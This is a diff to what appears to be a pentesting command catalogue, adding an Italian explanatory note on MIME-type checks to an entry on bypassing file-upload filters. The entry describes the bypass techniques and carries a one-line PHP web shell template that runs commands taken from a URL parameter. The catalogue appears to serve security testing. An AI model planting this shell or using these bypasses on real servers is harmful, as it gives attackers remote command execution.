@@ -1610,6 +1610,8 @@ const COMMANDS = [
     id: 'file-upload', name: 'File Upload — bypass',
     category: 'vuln-analysis', subcategory: 'web-app-testing', group: 'File Upload',
     description: 'Carica una web shell aggirando i controlli: estensione alternativa, Content-Type falso, magic bytes immagine, doppia estensione.',
+    note: `# 🔥 MIME-Type
+Un altro meccanismo, ben più comune e robusto rispetto al semplice controllo dell'estensione del file, è rappresentato dalla **verifica del MIME-Type**, ossia il tipo di contenuto del file. Il MIME (*Multipurpose Internet Mail Extensions*) è uno standard che identifica il tipo di file in base al suo contenuto reale, analizzando la sua struttura in byte piuttosto che basarsi unicamente sull'estensione.`,
     platform: 'cross-platform', requires: ['no-creds'], protocols: ['http'],
     tags: ['file-upload', 'webshell', 'rce'],
     template: "<?php system($_GET['cmd']); ?>",
